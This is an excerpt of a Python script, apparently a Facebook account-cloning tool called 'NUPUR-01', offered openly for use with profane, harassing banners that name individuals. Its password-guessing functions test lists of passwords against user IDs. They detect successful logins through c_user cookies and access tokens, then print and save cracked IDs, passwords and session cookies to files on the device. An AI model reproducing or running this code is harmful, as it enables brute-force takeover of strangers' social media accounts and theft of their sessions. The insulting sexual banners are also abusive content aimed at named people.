...
#- ALL BUG FIXED BY - LMNx9
#- JOIN - @DARK_TEAM_LMNx9
...
lol = (f"""\33[1m92m______          _                                   
\33[1m92m_ |  ____|        | |                                  
\33[1m92m_| |__ _   _  ___| | __  _ __  _   _ _ __  _   _ _ __ 
\33[1m92m_|  __| | | |/ __| |/ / | '_ \| | | | '_ \| | | | '__|
\33[1m92m_| |  | |_| | (__|   <  | | | | |_| | |_) | |_| | |   
\33[1m92m_ |_|   \__,_|\___|_|\_\ |_| |_|\__,_| .__/ \__,_|_|   
                                    | |               
                                    |_|          """)    
...
jalan('\n\t>_ FUCKED BY - SIKDER ')
#jalan('\x1b[1;31mNUPUR CYBER  NUPUR-01 CLONING START PLEASE WAIT ..........')
time.sleep(3)
os.system('clear')
...
______          _                                   
 |  ____|        | |                                  
 | |__ _   _  ___| | __  _ __  _   _ _ __  _   _ _ __ 
 |  __| | | |/ __| |/ / | '_ \| | | | '_ \| | | | '__|
 | |  | |_| | (__|   <  | | | | |_| | |_) | |_| | |   
 |_|   \__,_|\___|_|\_\ |_| |_|\__,_| .__/ \__,_|_|   
                                    | |               
                                    |_|
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} SIKDER-CYBER            {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}SIKDER OBEAYDUL           {N}{M} ║
      {H}║{M}[{H}•{M}] GITHUB    : {H}SIKDER-XD{N}       {H}   ║
      {M}║{M}[{H}•{M}] STATUS    : {H}SIKDER -XD{P}     {N}  {H}        ║
      {M}║{M}[{H}•{M}] VERSION   : {H}2024                  {H}  ║
      {M}╚═════════════{H}═══════════════════════════╝ {P}""")
...
def main():
    os.system('clear')
    print('\n\n\n [😅] FUCK NUPUR PUSSY & POM POM  - SIKDER')
    time.sleep(4)
    os.system('clear')
    print(lol)
    print(f' ')
    
    print(f'{M}╔══[•] TOOL NAME : {H}NUPUR GREEN X')
    print(f'{M}║══[•] YOUR KEY  :{H} FUCKED BY - SIKDER')#+key)
    print(f'{M}║══[•] VERSION   : {H}NUPUR-01')
    print(f'{M}╚══[•] CODER NAME: {H}NUPUR QUEEN')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART NUPUR-01  CLONING {RED}(TCW)")
...
def _xxx_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}NUPUR QUEEN')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART NUPUR-01  RANDOM {RED}(TCW)")
    print(f"{M}╔══[{M}2{RED}] \033[1;31mSTART NUPUR-01  X GMAIL {RED}(TCW)")
...
def _pornhub_():
    ...
    print(f'{M}╔══[•] TOOL NAME : {H}NUPUR GREEN X')
    print(f'{M}║══[•] YOUR KEY  :{H} FUCKED BY - LMNx9')# +key)
    print(f'{M}║══[•] VERSION   : {H}NUPUR-01')
    print(f'{M}╚══[•] CODER NAME: {H}NUPUR QUEEN')
    print(" ")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/NUPUR/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
...
def gmail():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}NUPUR{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            shanto = random.choice(["\x1b[1;91mNUPUR","\x1b[1;92mNUPUR","\x1b[1;93mNUPUR","\x1b[1;94mNUPUR","\x1b[1;95mNUPUR","\x1b[1;96mNUPUR","\x1b[1;97mNUPUR","\x1b[1;91mNUPUR","\x1b[1;92mNUPUR","\x1b[1;93mNUPUR","\x1b[1;94mNUPUR","\x1b[1;95mNUPUR","\x1b[1;96mNUPUR"])
...
#-------[ UP- 12/06/ LMNx9 ]---------
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NUPUR-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NUPUR-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NUPUR-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NUPUR-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[NUPUR-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI💉] {RED}'+coki)
                      open('/sdcard/NUPUR-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mNUPUR\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mNUPUR","\x1b[1;92mNUPUR","\x1b[1;93mNUPUR","\x1b[1;94mNUPUR","\x1b[1;95mNUPUR","\x1b[1;96mNUPUR","\x1b[1;97mNUPUR","\x1b[1;91mNUPUR","\x1b[1;92mNUPUR","\x1b[1;93mNUPUR","\x1b[1;94mNUPUR","\x1b[1;95mNUPUR","\x1b[1;96mNUPUR"])
...
#-----[ UPDATE GRAPH - 12/06 LMNx9 ]
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NUPUR-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NUPUR-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mNUPUR","\x1b[1;92mNUPUR","\x1b[1;93mNUPUR","\x1b[1;94mNUPUR","\x1b[1;95mNUPUR","\x1b[1;96mNUPUR","\x1b[1;97mNUPUR","\x1b[1;91mNUPUR","\x1b[1;92mNUPUR","\x1b[1;93mNUPUR","\x1b[1;94mNUPUR","\x1b[1;95mNUPUR","\x1b[1;96mNUPUR"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[NUPUR-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NUPUR-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NUPUR-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NUPUR-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
